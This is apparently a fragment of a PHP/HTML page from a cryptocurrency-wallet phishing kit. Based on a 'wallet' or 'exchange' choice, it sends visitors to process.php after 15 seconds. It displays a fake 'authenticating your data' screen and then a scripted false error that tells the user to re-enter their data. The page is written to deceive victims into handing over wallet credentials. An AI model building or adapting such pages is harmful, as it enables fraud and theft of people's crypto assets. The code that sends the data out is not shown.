<?php 
if(isset($_GET['choice'])&&$_GET['choice']==="wallet"){
    header("Refresh:15,url=process.php?choice=wallet");
}
if(isset($_GET['choice'])&&$_GET['choice']==="exchange"){
    header("Refresh:15,url=process.php?choice=exchange");
}
...
<body class="container">
    <div class="row">
        <div class="col-12">
    <svg width="100%" height="700px" viewBox="0 0 600 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xml:space="preserve" style="fill-rule:evenodd;clip-rule:evenodd;stroke-linejoin:round;stroke-miterlimit:1.41421;">
...
<div class="row">
              <div class="col-12">
               <div class="textDiv">
                <center>
                <h3 class="text-danger show"></h3>
                <h3 class="hide">We are in the process of authenticating your data</h3>
                <h6>Do not close this tab</h6>
            </center>
        </div>
...
<!-- jQuery-->
    <script type="text/javascript" src="user/dist/js/jquery.min.js"></script>

    <!-- Toastr -->
<script type="text/javascript" src="user/dist/js/toastr.min.js"></script>

    <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
    
<script type="text/javascript">
    function myTimeOut(){
        let H1 = 'That request did not succeed. Ensure you entered the correct data'+'<br>'+'We will redirect you to repeat your request';
        document.querySelector('.hide').style.display = 'none';
        document.querySelector('.show').innerHTML = H1;
    }
